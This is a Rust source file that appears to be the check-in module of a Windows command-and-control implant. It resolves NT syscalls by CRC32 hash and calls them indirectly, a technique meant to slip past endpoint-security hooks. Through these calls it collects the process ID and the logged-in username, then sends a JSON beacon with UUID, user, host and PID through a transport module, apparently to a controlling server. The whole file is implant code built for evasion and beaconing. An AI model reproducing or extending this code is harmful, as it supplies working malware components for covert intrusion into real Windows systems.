use crate::config;
use crate::transport;
use crate::hellshall::{NtSyscall, RunSyscall, SetSSn, fetch_nt_syscall,crc32h};

use ntapi::ntpsapi::{PROCESS_BASIC_INFORMATION, ProcessBasicInformation};
use winapi::shared::ntdef::NTSTATUS;
use std::{mem::{size_of, zeroed}, ptr};

use winapi::shared::minwindef::DWORD;
use winapi::um::winnt::{TOKEN_USER, TokenUser, TOKEN_QUERY, SID_NAME_USE};
use winapi::um::winbase::LookupAccountSidW;
use winapi::um::winnt::PSID;
use windows_sys::Win32::System::Threading::GetCurrentProcess;
use windows_sys::Win32::Foundation::FALSE;
use winapi::ctypes::c_void;
use std::ffi::OsString;
use std::os::windows::ffi::OsStringExt;


fn get_pid_via_syscall() -> u32 {
    unsafe {
        let hash = crc32h("NtQueryInformationProcess");

        let mut nt_query = NtSyscall {
            dw_ssn: 0,
            dw_syscall_hash: 0,
            p_syscall_address: ptr::null_mut(),
            p_syscall_inst_address: ptr::null_mut(),
        };

        if !fetch_nt_syscall(hash, &mut nt_query) {
            return 0;
        }

        SetSSn(nt_query.dw_ssn as u16, nt_query.p_syscall_inst_address);

        let mut pbi: PROCESS_BASIC_INFORMATION = zeroed();
        let mut ret_len: u32 = 0;

        let status: NTSTATUS = RunSyscall(
            GetCurrentProcess() as _,
            ProcessBasicInformation as _,
            &mut pbi as *mut _ as _,
            size_of::<PROCESS_BASIC_INFORMATION>() as _,
            &mut ret_len as *mut _ as _,
            ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
            ptr::null_mut(), ptr::null_mut(), ptr::null_mut()
        );

        if status == 0 {
            pbi.UniqueProcessId as u32
        } else {
            0
        }
    }
}

fn get_current_username_syscall_direct() -> Result<String, String> {
    unsafe {
        let hash = crc32h("NtOpenProcessToken");
        let mut nt_open_token = NtSyscall::default();

        if !fetch_nt_syscall(hash, &mut nt_open_token) {
            return Err("Failed to resolve NtOpenProcessToken".into());
        }

        SetSSn(nt_open_token.dw_ssn as u16, nt_open_token.p_syscall_inst_address);

        let mut token_handle = ptr::null_mut();
        let status = RunSyscall(
            GetCurrentProcess() as *mut c_void,
            TOKEN_QUERY as usize as *mut c_void,
            &mut token_handle as *mut _ as *mut c_void,
            ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
            ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
            ptr::null_mut(), ptr::null_mut(),
        );

        if status != 0 {
            return Err(format!("NtOpenProcessToken failed: 0x{:X}", status));
        }

        let hash = crc32h("NtQueryInformationToken");
        let mut nt_query_token = NtSyscall::default();

        if !fetch_nt_syscall(hash, &mut nt_query_token) {
            return Err("Failed to resolve NtQueryInformationToken".into());
        }

        SetSSn(nt_query_token.dw_ssn as u16, nt_query_token.p_syscall_inst_address);

        let mut return_length = 0u32;
        let status = RunSyscall(
            token_handle,
            TokenUser as usize as *mut c_void,
            ptr::null_mut(),
            ptr::null_mut(),
            &mut return_length as *mut _ as *mut c_void,
            ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
            ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
        );


        let mut buffer = vec![0u8; return_length as usize];
        let token_user = buffer.as_mut_ptr() as *mut TOKEN_USER;

        let status = RunSyscall(
            token_handle,
            TokenUser as usize as *mut c_void,
            buffer.as_mut_ptr() as *mut c_void,
            return_length as usize as *mut c_void,
            &mut return_length as *mut _ as *mut c_void,
            ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
            ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
        );

        if status != 0 {
            return Err(format!("NtQueryInformationToken failed: 0x{:X}", status));
        }

        let mut name = [0u16; 256];
        let mut domain = [0u16; 256];
        let mut name_len = name.len() as DWORD;
        let mut domain_len = domain.len() as DWORD;
        let mut sid_use = SID_NAME_USE::default();

        if LookupAccountSidW(
            ptr::null_mut(),
            (*token_user).User.Sid as PSID,
            name.as_mut_ptr(),
            &mut name_len,
            domain.as_mut_ptr(),
            &mut domain_len,
            &mut sid_use,
        ) == FALSE {
            return Err(format!("LookupAccountSidW failed: {}", std::io::Error::last_os_error()));
        }

        let username = OsString::from_wide(&name[..name_len as usize]);
        Ok(username.to_string_lossy().into_owned())
    }
}

pub fn checkin() {
    let checkin_data = serde_json::json!({
        "action": "checkin",
        "uuid": *config::UUID,
        "os": "windows",
        "user": get_current_username_syscall_direct().unwrap_or_else(|_| "Unknown".to_string()),
        "host": "COMMANDO",
        "pid": get_pid_via_syscall(),
        "architecture": "x64"
    });

    let json_str = serde_json::to_string(&checkin_data).unwrap();
    transport::send_request(&json_str);
}
